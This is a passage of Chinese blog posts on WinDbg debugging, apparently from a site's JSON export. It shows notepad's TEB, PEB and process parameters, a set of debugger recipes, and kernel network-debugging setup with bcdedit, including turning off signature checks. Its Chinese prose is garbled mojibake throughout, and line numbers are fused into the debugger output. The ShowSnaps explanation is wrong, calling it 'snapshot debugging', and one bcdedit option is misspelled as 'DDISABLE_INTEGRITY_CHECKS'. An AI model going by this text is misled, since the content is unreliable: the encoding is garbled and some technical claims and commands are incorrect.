notepad å›è½¦å³å¯ã€‚ è¿è¡Œ windbgï¼Œå¹¶é™„åŠ åˆ°è¿›ç¨‹ notepad.exe ä¸Šã€‚ å¼€å§‹è°ƒè¯• æŸ¥çœ‹å½“å‰çº¿ç¨‹ ä½¿ç”¨ ~. æŸ¥çœ‹å½“å‰çº¿ç¨‹(è¿™é‡Œå…¶å®æŸ¥çœ‹å“ªä¸ªçº¿ç¨‹éƒ½å¯ä»¥ï¼Œå› ä¸ºå½“å‰è¿›ç¨‹çš„ PEB åªæœ‰ä¸€ä¸ªï¼Œæ‰€æœ‰çš„ TEB éƒ½æŒ‡å‘äº†åŒä¸€ä¸ª PEB) 12340:007&gt; ~.. 7 Id: b8f4.d5a0 Suspend: 1 Teb: 000000a3`b61d1000 Unfrozen Start: ntdll!DbgUiRemoteBreakin (00007ff9`ab83c9c0) Priority: 0 Priority class: 32 Affinity: ff å¯ä»¥çœ‹åˆ° Teb åœ°å€ä¸º 000000a3â€˜b61d1000000000a3`b61d1000000000a3â€˜b61d1000 æŸ¥çœ‹TEB 1dt ntdll!_Teb 000000a3`b61d1000 è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ° 0x060 åç§»å¤„ä¸º _PEBï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271280:007&gt; dt ntdll!_Teb 000000a3`b61d1000 +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : (null) +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : (null) +0x058 ThreadLocalStoragePointer : (null) +0x060 ProcessEnvironmentBlock : 0x000000a3`b61b8000 _PEB +0x068 LastErrorValue : 0 +0x06c CountOfOwnedCriticalSections : 0 +0x070 CsrClientThread : (null) +0x078 Win32ThreadInfo : (null) +0x080 User32Reserved : [26] 0 +0x0e8 UserReserved : [5] 0 +0x100 WOW32Reserved : (null) +0x108 CurrentLocale : 0x804 +0x10c FpSoftwareStatusRegister : 0 +0x110 ReservedForDebuggerInstrumentation : [16] (null) +0x190 SystemReserved1 : [30] (null) +0x280 PlaceholderCompatibilityMode : 0 &#x27;&#x27; +0x281 PlaceholderHydrationAlwaysExplicit : 0 &#x27;&#x27; +0x282 PlaceholderReserved : [10] &quot;&quot; +0x28c ProxiedProcessId : 0 +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK +0x2b8 WorkingOnBehalfTicket : [8] &quot;&quot; +0x2c0 ExceptionCode : 0n0 +0x2c4 Padding0 : [4] &quot;&quot; +0x2c8 ActivationContextStackPointer : 0x000000a3`b61d1290 _ACTIVATION_CONTEXT_STACK +0x2d0 InstrumentationCallbackSp : 0 +0x2d8 InstrumentationCallbackPreviousPc : 0 +0x2e0 InstrumentationCallbackPreviousSp : 0 +0x2e8 TxFsContext : 0xfffe +0x2ec InstrumentationCallbackDisabled : 0 &#x27;&#x27; +0x2ed UnalignedLoadStoreExceptions : 0 &#x27;&#x27; +0x2ee Padding1 : [2] &quot;&quot; +0x2f0 GdiTebBatch : _GDI_TEB_BATCH +0x7d8 RealClientId : _CLIENT_ID +0x7e8 GdiCachedProcessHandle : (null) +0x7f0 GdiClientPID : 0 +0x7f4 GdiClientTID : 0 +0x7f8 GdiThreadLocalInfo : (null) +0x800 Win32ClientInfo : [62] 0 +0x9f0 glDispatchTable : [233] (null) +0x1138 glReserved1 : [29] 0 +0x1220 glReserved2 : (null) +0x1228 glSectionInfo : (null) +0x1230 glSection : (null) +0x1238 glTable : (null) +0x1240 glCurrentRC : (null) +0x1248 glContext : (null) +0x1250 LastStatusValue : 0 +0x1254 Padding2 : [4] &quot;&quot; +0x1258 StaticUnicodeString : _UNICODE_STRING &quot;&quot; +0x1268 StaticUnicodeBuffer : [261] &quot;&quot; +0x1472 Padding3 : [6] &quot;&quot; +0x1478 DeallocationStack : 0x000000a3`b6400000 Void +0x1480 TlsSlots : [64] (null) +0x1680 TlsLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x1690 Vdm : (null) +0x1698 ReservedForNtRpc : (null) +0x16a0 DbgSsReserved : [2] (null) +0x16b0 HardErrorMode : 0 +0x16b4 Padding4 : [4] &quot;&quot; +0x16b8 Instrumentation : [11] (null) +0x1710 ActivityId : _GUID &#123;00000000-0000-0000-0000-000000000000&#125; +0x1720 SubProcessTag : (null) +0x1728 PerflibData : (null) +0x1730 EtwTraceData : (null) +0x1738 WinSockData : (null) +0x1740 GdiBatchCount : 0 +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER +0x1744 IdealProcessorValue : 0x3030000 +0x1744 ReservedPad0 : 0 &#x27;&#x27; +0x1745 ReservedPad1 : 0 &#x27;&#x27; +0x1746 ReservedPad2 : 0x3 &#x27;&#x27; +0x1747 IdealProcessor : 0x3 &#x27;&#x27; +0x1748 GuaranteedStackBytes : 0 +0x174c Padding5 : [4] &quot;&quot; +0x1750 ReservedForPerf : (null) +0x1758 ReservedForOle : (null) +0x1760 WaitingOnLoaderLock : 0 +0x1764 Padding6 : [4] &quot;&quot; +0x1768 SavedPriorityState : (null) +0x1770 ReservedForCodeCoverage : 0 +0x1778 ThreadPoolData : (null) +0x1780 TlsExpansionSlots : (null) +0x1788 DeallocationBStore : (null) +0x1790 BStoreLimit : (null) +0x1798 MuiGeneration : 0 +0x179c IsImpersonating : 0 +0x17a0 NlsCache : (null) +0x17a8 pShimData : (null) +0x17b0 HeapData : 0 +0x17b4 Padding7 : [4] &quot;&quot; +0x17b8 CurrentTransactionHandle : (null) +0x17c0 ActiveFrame : (null) +0x17c8 FlsData : (null) +0x17d0 PreferredLanguages : (null) +0x17d8 UserPrefLanguages : (null) +0x17e0 MergedPrefLanguages : (null) +0x17e8 MuiImpersonation : 0 +0x17ec CrossTebFlags : 0 +0x17ec SpareCrossTebBits : 0y0000000000000000 (0) +0x17ee SameTebFlags : 8 +0x17ee SafeThunkCall : 0y0 +0x17ee InDebugPrint : 0y0 +0x17ee HasFiberData : 0y0 +0x17ee SkipThreadAttach : 0y1 +0x17ee WerInShipAssertCode : 0y0 +0x17ee RanProcessInit : 0y0 +0x17ee ClonedThread : 0y0 +0x17ee SuppressDebugMsg : 0y0 +0x17ee DisableUserStackWalk : 0y0 +0x17ee RtlExceptionAttached : 0y0 +0x17ee InitialThread : 0y0 +0x17ee SessionAware : 0y0 +0x17ee LoadOwner : 0y0 +0x17ee LoaderWorker : 0y0 +0x17ee SkipLoaderInit : 0y0 +0x17ee SpareSameTebBits : 0y0 +0x17f0 TxnScopeEnterCallback : (null) +0x17f8 TxnScopeExitCallback : (null) +0x1800 TxnScopeContext : (null) +0x1808 LockCount : 0 +0x180c WowTebOffset : 0n0 +0x1810 ResourceRetValue : (null) +0x1818 ReservedForWdf : (null) +0x1820 ReservedForCrt : 0 +0x1828 EffectiveContainerId : _GUID &#123;00000000-0000-0000-0000-000000000000&#125; æŸ¥çœ‹PEB 1234dt ntdll!_PEB 0xa3b61b8000# æˆ–è€…ä½¿ç”¨ dx å‘½ä»¤dx -r1 ((ntdll!_PEB *)0xa3b61b8000) è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼Œåˆ°æ­¤å°±çœ‹åˆ°äº† notepad çš„ PEB äº†ã€‚åæ–‡è¡¥å……äº† PEB ç»“æ„ä½“ä¸­ ProcessParameters å˜é‡çš„åˆ†æå’ŒæŸ¥çœ‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151160:007&gt; dt ntdll!_PEB 0xa3b61b8000 +0x000 InheritedAddressSpace : 0 &#x27;&#x27; +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27; +0x002 BeingDebugged : 0x1 &#x27;&#x27; +0x003 BitField : 0x84 &#x27;&#x27; +0x003 ImageUsesLargePages : 0y0 +0x003 IsProtectedProcess : 0y0 +0x003 IsImageDynamicallyRelocated : 0y1 +0x003 SkipPatchingUser32Forwarders : 0y0 +0x003 IsPackagedProcess : 0y0 +0x003 IsAppContainer : 0y0 +0x003 IsProtectedProcessLight : 0y0 +0x003 IsLongPathAwareProcess : 0y1 +0x004 Padding0 : [4] &quot;&quot; +0x008 Mutant : 0xffffffff`ffffffff Void +0x010 ImageBaseAddress : 0x00007ff7`7ef80000 Void +0x018 Ldr : 0x00007ff9`ab8db4c0 _PEB_LDR_DATA +0x020 ProcessParameters : 0x000001a6`50d52540 _RTL_USER_PROCESS_PARAMETERS +0x028 SubSystemData : 0x00007ff9`9f7af1d0 Void +0x030 ProcessHeap : 0x000001a6`50d50000 Void +0x038 FastPebLock : 0x00007ff9`ab8db0e0 _RTL_CRITICAL_SECTION +0x040 AtlThunkSListPtr : (null) +0x048 IFEOKey : (null) +0x050 CrossProcessFlags : 1 +0x050 ProcessInJob : 0y1 +0x050 ProcessInitializing : 0y0 +0x050 ProcessUsingVEH : 0y0 +0x050 ProcessUsingVCH : 0y0 +0x050 ProcessUsingFTH : 0y0 +0x050 ProcessPreviouslyThrottled : 0y0 +0x050 ProcessCurrentlyThrottled : 0y0 +0x050 ProcessImagesHotPatched : 0y0 +0x050 ReservedBits0 : 0y000000000000000000000000 (0) +0x054 Padding1 : [4] &quot;&quot; +0x058 KernelCallbackTable : 0x00007ff9`a9a80070 Void +0x058 UserSharedInfoPtr : 0x00007ff9`a9a80070 Void +0x060 SystemReserved : 0 +0x064 AtlThunkSListPtr32 : 0 +0x068 ApiSetMap : 0x000001a6`50c80000 Void +0x070 TlsExpansionCounter : 0 +0x074 Padding2 : [4] &quot;&quot; +0x078 TlsBitmap : 0x00007ff9`ab8db440 Void +0x080 TlsBitmapBits : [2] 0xffffffff +0x088 ReadOnlySharedMemoryBase : 0x00007df4`3dce0000 Void +0x090 SharedData : (null) +0x098 ReadOnlyStaticServerData : 0x00007df4`3dce0750 -&gt; (null) +0x0a0 AnsiCodePageData : 0x00007df5`3fe30000 Void +0x0a8 OemCodePageData : 0x00007df5`3fe30000 Void +0x0b0 UnicodeCaseTableData : 0x00007df5`3fe60028 Void +0x0b8 NumberOfProcessors : 8 +0x0bc NtGlobalFlag : 0 +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000 +0x0c8 HeapSegmentReserve : 0x100000 +0x0d0 HeapSegmentCommit : 0x2000 +0x0d8 HeapDeCommitTotalFreeThreshold : 0x10000 +0x0e0 HeapDeCommitFreeBlockThreshold : 0x1000 +0x0e8 NumberOfHeaps : 6 +0x0ec MaximumNumberOfHeaps : 0x10 +0x0f0 ProcessHeaps : 0x00007ff9`ab8d9d40 -&gt; 0x000001a6`50d50000 Void +0x0f8 GdiSharedHandleTable : 0x000001a6`51120000 Void +0x100 ProcessStarterHelper : (null) +0x108 GdiDCAttributeList : 0x14 +0x10c Padding3 : [4] &quot;&quot; +0x110 LoaderLock : 0x00007ff9`ab8d55c8 _RTL_CRITICAL_SECTION +0x118 OSMajorVersion : 0xa +0x11c OSMinorVersion : 0 +0x120 OSBuildNumber : 0x4a65 +0x122 OSCSDVersion : 0 +0x124 OSPlatformId : 2 +0x128 ImageSubsystem : 2 +0x12c ImageSubsystemMajorVersion : 0xa +0x130 ImageSubsystemMinorVersion : 0 +0x134 Padding4 : [4] &quot;&quot; +0x138 ActiveProcessAffinityMask : 0xff +0x140 GdiHandleBuffer : [60] 0 +0x230 PostProcessInitRoutine : (null) +0x238 TlsExpansionBitmap : 0x00007ff9`ab8db420 Void +0x240 TlsExpansionBitmapBits : [32] 1 +0x2c0 SessionId : 1 +0x2c4 Padding5 : [4] &quot;&quot; +0x2c8 AppCompatFlags : _ULARGE_INTEGER 0x0 +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0 +0x2d8 pShimData : 0x000001a6`50cc0000 Void +0x2e0 AppCompatInfo : (null) +0x2e8 CSDVersion : _UNICODE_STRING &quot;&quot; +0x2f8 ActivationContextData : 0x000001a6`50cb0000 _ACTIVATION_CONTEXT_DATA +0x300 ProcessAssemblyStorageMap : 0x000001a6`50d5b5c0 _ASSEMBLY_STORAGE_MAP +0x308 SystemDefaultActivationContextData : 0x000001a6`50ca0000 _ACTIVATION_CONTEXT_DATA +0x310 SystemAssemblyStorageMap : (null) +0x318 MinimumStackCommit : 0 +0x320 SparePointers : [4] (null) +0x340 SpareUlongs : [5] 0 +0x358 WerRegistrationData : 0x000001a6`52e00000 Void +0x360 WerShipAssertPtr : (null) +0x368 pUnused : (null) +0x370 pImageHeaderHash : (null) +0x378 TracingFlags : 0 +0x378 HeapTracingEnabled : 0y0 +0x378 CritSecTracingEnabled : 0y0 +0x378 LibLoaderTracingEnabled : 0y0 +0x378 SpareTracingBits : 0y00000000000000000000000000000 (0) +0x37c Padding6 : [4] &quot;&quot; +0x380 CsrServerReadOnlySharedMemoryBase : 0x00007df4`66cb0000 +0x388 TppWorkerpListLock : 0 +0x390 TppWorkerpList : _LIST_ENTRY [ 0x000000a3`b5f0f860 - 0x000000a3`b63ffb70 ] +0x3a0 WaitOnAddressHashTable : [128] (null) +0x7a0 TelemetryCoverageHeader : (null) +0x7a8 CloudFileFlags : 0xe0 +0x7ac CloudFileDiagFlags : 0 +0x7b0 PlaceholderCompatibilityMode : 2 &#x27;&#x27; +0x7b1 PlaceholderCompatibilityModeReserved : [7] &quot;&quot; +0x7b8 LeapSecondData : 0x00007df5`3fe20000 _LEAP_SECOND_DATA +0x7c0 LeapSecondFlags : 0 +0x7c0 SixtySecondEnabled : 0y0 +0x7c0 Reserved : 0y0000000000000000000000000000000 (0) +0x7c4 NtGlobalFlag2 : 0 æŸ¥çœ‹ ProcessParameters ä¸ºäº†è¿›ä¸€æ­¥äº†è§£å’ŒæŸ¥çœ‹ï¼Œè¿™é‡Œå†æŸ¥çœ‹ ProcessParameters çš„å˜é‡ã€‚ æŸ¥çœ‹ PEB çš„è¾“å‡ºå¯ä»¥çœ‹åˆ° ProcessParameters çš„ç»“æ„ä½“åä¸º _RTL_USER_PROCESS_PARAMETERSï¼Œè¯¥ç»“æ„ä½“ä¿å­˜äº†è¿›ç¨‹å¾ˆå¤šåŸºç¡€ä¿¡æ¯ï¼Œå¦‚ç¯å¢ƒå˜é‡ã€å‘½ä»¤è¡Œç­‰ç­‰ã€‚æŸ¥çœ‹å½“å‰ ProcessParameters 12345dx -r1 ((ntdll!_RTL_USER_PROCESS_PARAMETERS *)0x1a650d52540)# æˆ–è€…dt _RTL_USER_PROCESS_PARAMETERS 0x1a650d52540 è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839400:007&gt; dt _RTL_USER_PROCESS_PARAMETERS 0x1a650d52540ntdll!_RTL_USER_PROCESS_PARAMETERS +0x000 MaximumLength : 0x78a +0x004 Length : 0x78a +0x008 Flags : 0x6001 +0x00c DebugFlags : 0 +0x010 ConsoleHandle : (null) +0x018 ConsoleFlags : 0 +0x020 StandardInput : (null) +0x028 StandardOutput : (null) +0x030 StandardError : (null) +0x038 CurrentDirectory : _CURDIR +0x050 DllPath : _UNICODE_STRING &quot;&quot; +0x060 ImagePathName : _UNICODE_STRING &quot;C:\\WINDOWS\\system32\\notepad.exe&quot; +0x070 CommandLine : _UNICODE_STRING &quot;&quot;C:\\WINDOWS\\system32\\notepad.exe&quot; &quot; +0x080 Environment : 0x000001a6`50d50fe0 Void +0x088 StartingX : 0 +0x08c StartingY : 0 +0x090 CountX : 0 +0x094 CountY : 0 +0x098 CountCharsX : 0 +0x09c CountCharsY : 0 +0x0a0 FillAttribute : 0 +0x0a4 WindowFlags : 0x801 +0x0a8 ShowWindowFlags : 1 +0x0b0 WindowTitle : _UNICODE_STRING &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Notepad.lnk&quot; +0x0c0 DesktopInfo : _UNICODE_STRING &quot;Winsta0\\Default&quot; +0x0d0 ShellInfo : _UNICODE_STRING &quot;&quot; +0x0e0 RuntimeData : _UNICODE_STRING &quot;&quot; +0x0f0 CurrentDirectores : [32] _RTL_DRIVE_LETTER_CURDIR +0x3f0 EnvironmentSize : 0x154e +0x3f8 EnvironmentVersion : 3 +0x400 PackageDependencyData : (null) +0x408 ProcessGroupId : 0x3ec +0x40c LoaderThreads : 0 +0x410 RedirectionDllName : _UNICODE_STRING &quot;&quot; +0x420 HeapPartitionName : _UNICODE_STRING &quot;&quot; +0x430 DefaultThreadpoolCpuSetMasks : (null) +0x438 DefaultThreadpoolCpuSetMaskCount : 0 +0x43c DefaultThreadpoolThreadMaximum : 0 åˆ°è¿™ä¸€æ­¥ï¼ŒåŸºæœ¬ä¸Šè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯å°±éƒ½å¯ä»¥çœ‹åˆ°äº†ã€‚å¦‚æœæ˜¯ windbg preview ç‰ˆæœ¬ï¼Œç‚¹å‡ ä¸‹å°±èƒ½çœ‹åˆ°ä¸€äº›ä¿¡æ¯ï¼Œä½†æ˜¯ Environment ç¯å¢ƒå˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹ï¼Œè¿˜æ˜¯éœ€è¦è¾“å…¥å‘½ä»¤æ‰è¡Œã€‚ æŸ¥çœ‹ Environment åœ¨ _RTL_USER_PROCESS_PARAMETERS ç»“æ„ä¸­æœ‰ä¸‰ä¸ªæˆå‘˜ä¸ Environment ç›¸å…³ 12345678# æŒ‡å‘ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆ+0x080 Environment : 0x000001a6`50d50fe0 Void# ç¯å¢ƒå˜é‡çš„å¤§å°+0x3f0 EnvironmentSize : 0x154e# ç¯å¢ƒå˜é‡çš„ç‰ˆæœ¬+0x3f8 EnvironmentVersion : 3 é€šè¿‡ç¯å¢ƒå˜é‡æŒ‡é’ˆå’Œå¤§å°æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ç¯å¢ƒå˜é‡çš„å†…å®¹äº† 1db 0x000001a6`50d50fe0 l 0x154e","tags":[{"name":"Debug","slug":"Debug","permalink":"https://hodlyounger.github.io/tags/Debug/"},{"name":"PEB","slug":"PEB","permalink":"https://hodlyounger.github.io/tags/PEB/"},{"name":"TEB","slug":"TEB","permalink":"https://hodlyounger.github.io/tags/TEB/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€windbgã€‘å„ç§åœºæ™¯ä¸‹çš„è°ƒè¯•æƒ…å†µæ±‡æ€»","date":"2024-08-31T01:41:20.258Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘å„ç§åœºæ™¯ä¸‹è°ƒè¯•æ±‡æ€»/","text":"æ¦‚è¿°ï¼šæ•´ç†æ±‡æ€»å„ç§åœºæ™¯ä¸‹çš„è°ƒè¯•æ–¹æ³• å¯å‚è€ƒå¾®è½¯å®˜æ–¹æ–‡æ¡£è°ƒè¯•ï¼šè°ƒè¯•æ–¹æ³• - Windows drivers | Microsoft Learn è°ƒè¯•LDR 12345678910bp ntdll!LdrLoadDllåœ¨æ–­ç‚¹ä¸‹è¾“å…¥ï¼šeb Kd_LDR_MASK ffffffffeb Kd_MM_MASK ffffffffeb Kd_DEFAULT_MASK ffffffffeb ntdll!ShowSnaps 1eb ntdll!ShowErrors 1 æŸ¥çœ‹dllåŠ è½½ 1eb ntdll!ShowSnaps 1 eb ntdll!ShowSnaps 1è¿™ä¸€å‘½ä»¤æ˜¯åœ¨Windowsçš„NTæ“ä½œç³»ç»Ÿå†…æ ¸ï¼ˆntdll.dllï¼‰ä¸­è°ƒè¯•å¤šçº¿ç¨‹åº”ç”¨ç¨‹åºæ—¶ä½¿ç”¨çš„ã€‚å®ƒç”¨äºå¯ç”¨æˆ–ç¦ç”¨å¿«ç…§è°ƒè¯•ï¼ˆSnapshotsï¼‰ï¼Œè¿™æ˜¯ä¸€ç§åœ¨è°ƒè¯•æœŸé—´æ•è·ç‰¹å®šç³»ç»ŸçŠ¶æ€çš„è°ƒè¯•æŠ€æœ¯ã€‚ åœ¨è¿™é‡Œï¼Œebæ˜¯æŒ‡â€œç¼–è¾‘äºŒè¿›åˆ¶â€ï¼ˆEdit Binaryï¼‰çš„å‘½ä»¤ï¼Œå®ƒå…è®¸ä½ ä¿®æ”¹å†…å­˜ä¸­çš„äºŒè¿›åˆ¶æ•°æ®ã€‚ntdll!ShowSnapsæ˜¯ä½ è¦ä¿®æ”¹çš„å‡½æ•°ï¼Œè€Œ1æ˜¯ä½ è¦è®¾ç½®çš„å€¼ã€‚åœ¨è°ƒè¯•å¤šçº¿ç¨‹åº”ç”¨æ—¶ï¼ŒShowSnapså‡½æ•°ç”¨äºæ§åˆ¶æ˜¯å¦å¯ç”¨å¿«ç…§è°ƒè¯•ã€‚å¦‚æœå°†å…¶è®¾ç½®ä¸º1ï¼Œåˆ™å¯ç”¨å¿«ç…§è°ƒè¯•ï¼›å¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™ç¦ç”¨å¿«ç…§è°ƒè¯•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿®æ”¹ç³»ç»Ÿå†…æ ¸çš„ä»£ç å¯èƒ½ä¼šå¯¹ç³»ç»Ÿé€ æˆä¸¥é‡çš„ç ´åï¼Œå› æ­¤ï¼Œé™¤éä½ éå¸¸æ¸…æ¥šè‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¦åˆ™ä¸å»ºè®®è¿›è¡Œè¿™æ ·çš„æ“ä½œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœä½ è®¤ä¸ºéœ€è¦ä¿®æ”¹ç³»ç»Ÿå†…æ ¸çš„ä»£ç æ¥è°ƒè¯•ä½ çš„åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦å¯»æ‰¾å…¶ä»–æ–¹æ³•ï¼Œæˆ–è€…å¯»æ±‚ä¸“ä¸šçš„å¸®åŠ©ã€‚ è®¾ç½®æ—¥å¿—è®°å½•ä½ç½® 1.logopen /t c:\\logs\\mylogfile.txt æŸ¥çœ‹call å¯„å­˜å™¨æ—¶è°ƒç”¨çš„å‡½æ•° ç›¸å…³æ–‡ç« ï¼š ã€è°ƒè¯•æŠ€æœ¯ã€‘logexts 12345678bu RPCRT4!Invoke+0x73 &quot;u r10&quot;bu RPCRT4!Invoke+0x73-5 &quot;r ;gc&quot;# é«˜çº§ä¸€ç‚¹çš„ç”¨æ³•# åœ¨ r10 è¢«æ›´æ–°åçœ‹å°±å¯ä»¥äº†bu RPCRT4!Invoke+0x73-2d &quot;u r10 l5;gc&quot; è°ƒè¯•çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸º RPCRT4!invoke+73çš„ä½ç½®ï¼š å½“ç„¶è¿˜æœ‰å¯èƒ½ä¼šå› ä¸ºåæ±‡ç¼–å¤±è´¥å¯¼è‡´é˜»å¡ï¼Œè¿™é‡Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚åŠ å…¥ä¸€äº›åˆ¤æ–­ã€‚ 12# å…ˆä¿å­˜ä¸€ä¸‹å¯„å­˜å™¨ï¼Œå¦‚æœå‡½æ•°æ‰§è¡Œç»“æŸåè¿”å›çš„å€¼ä¸º0ï¼Œåˆ™å¯¹åŸæ¥çš„åœ°å€è¿›è¡Œåæ±‡ç¼–ï¼Œå¦åˆ™ä¸æ‰§è¡Œæ“ä½œba e1 RPCRT4!Invoke+0x62 &quot;r $t1 = @r10;p;.if(@eax == 0)&#123;gc&#125;.else&#123;r;? @r10&#125;&quot;","tags":[{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"Debug","slug":"Debug","permalink":"https://hodlyounger.github.io/tags/Debug/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘windowsåŒæœºè°ƒè¯•â€”â€”Netæ¨¡å¼","date":"2024-08-31T01:41:20.254Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘åŒæœºè°ƒè¯•/","text":"æ¦‚è¿°ï¼šwindows åŒæœºè°ƒè¯•å¯ä»¥åœ¨ä¸»é¡µæœç´¢ bcdedit å‘½ä»¤ã€‚åŒæœºè°ƒè¯•æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„æŠ€æœ¯ï¼Œæ–¹ä¾¿å†…æ ¸ã€é©±åŠ¨ç­‰è°ƒè¯•åœºæ™¯ã€‚æœ¬æ–‡ä¸»è¦è®°å½•ä½¿ç”¨netè°ƒè¯•çš„é…ç½®æ­¥éª¤ã€‚ å‚è€ƒå¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š Set up KDNET network kernel debugging manually - Windows drivers | Microsoft Learn WinFsp Debugging Setup Â· WinFsp é…ç½®ç›®æ ‡ä¸»æœº è¯´æ˜ï¼šéœ€è¦ä¸¤å°æœºå™¨ä¹‹é—´å¯ä»¥pingé€š å¼€å¯è°ƒè¯•æ¨¡å¼ æ³¨æ„ï¼šä¸èƒ½æœ‰å¤šä½™çš„ç©ºæ ¼ 123bcdedit /debug onbcdedit /dbgsettings net hostip:w.x.y.z port:n .rgmnqkgyxkfe{zoom:80%;} å­˜åœ¨å¤šä¸ªç½‘å¡æ—¶ å¦‚æœç›®æ ‡æœºæœ‰å¤šä¸ªç½‘å¡ï¼Œè¿˜éœ€è¦æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1bcdedit /set &#123;dbgsettings&#125; busparams b.d.f å…¶ä¸­bä¸ºæ€»çº¿å·ï¼Œdä¸ºè®¾å¤‡å·ï¼Œfä¸ºåŠŸèƒ½å·ï¼Œè¿™äº›å¯ä»¥åœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­æŸ¥åˆ°ã€‚ .qfcycwindnxm{zoom:80%;} ç¦ç”¨ç­¾åæ ¡éªŒ 12bcdedit.exe -set TESTSIGNING ONbcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS ä¸Šè¿°é…ç½®å®Œæˆåï¼Œé‡å¯æ“ä½œç³»ç»Ÿ é…ç½®windbg æ‰§è¡Œå®Œä¸Šè¿°å‘½ä»¤åä¼šå¾—åˆ°ä¸€ä¸ªkeyå€¼ï¼Œå°†keyå€¼å¡«å…¥åˆ°windbgé¡µé¢ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š é…ç½®ç¬¦å·æ–‡ä»¶è·¯å¾„ 1srv*D:\\Symbols*https://msdl.microsoft.com/download/symbols å‘½ä»¤è¡Œæ–¹å¼è¿æ¥ kdå‘½ä»¤ 1kd -k net:port=&lt;n&gt;,key=&lt;MyKey&gt; windbgè¿æ¥ 1windbg -k net:port=&lt;n&gt;,key=&lt;MyKey&gt; é‡å¯è°ƒè¯• å¦‚ä¸‹æ‰€ç¤ºï¼šé‡å¯åç›´æ¥æ–­ç‚¹ï¼Œå¯ä»¥ä»æ“ä½œç³»ç»Ÿå¯åŠ¨é˜¶æ®µå¼€å§‹è°ƒè¯•äº† æˆ–è€…ä½¿ç”¨cmdå‘½ä»¤ 1shutdown -r -t 0 åŒæœºè°ƒè¯•æ¨¡å¼ä¸‹è°ƒè¯•ç”¨æˆ·æ€è¿›ç¨‹ è¿‡ç¨‹å¦‚ä¸‹ï¼š 1ã€!process 0 0 ç›®æ ‡è¿›ç¨‹å è·å–ç›®æ ‡è¿›ç¨‹EPROCESSåŸºæœ¬ä¿¡æ¯ 2ã€.process /p +EPROCESSä¿¡æ¯ åˆ‡æ¢åˆ°ç›®æ ‡è¿›ç¨‹ç©ºé—´ 3ã€.reload /f /user å¼ºåˆ¶é‡æ–°åŠ è½½ç”¨æˆ·æ€ç¬¦å· 4ã€.process /i /p ç›®æ ‡è¿›ç¨‹çš„EPROCESS ä¾µå…¥å¼è°ƒè¯• 5ã€bp ç›®æ ‡API æ‰§è¡Œä¸‹æ–­ç‚¹å‘½ä»¤ Debugging a user mode process from kernel mode WinDbg In order to debug a user mode process from a kernel mode WinDbg session, break into the debugger and issue the following commands: 12kd&gt; !gflag +kslkd&gt; sxe ld MODULE-NAME.exe Restart the debugger and it will break within process creation. You can now set a breakpoint at your process wmain (or main, etc.): 1kd&gt; bp MODULE_NAME!wmain Restart the debugger and it will stop at your programâ€™s entry 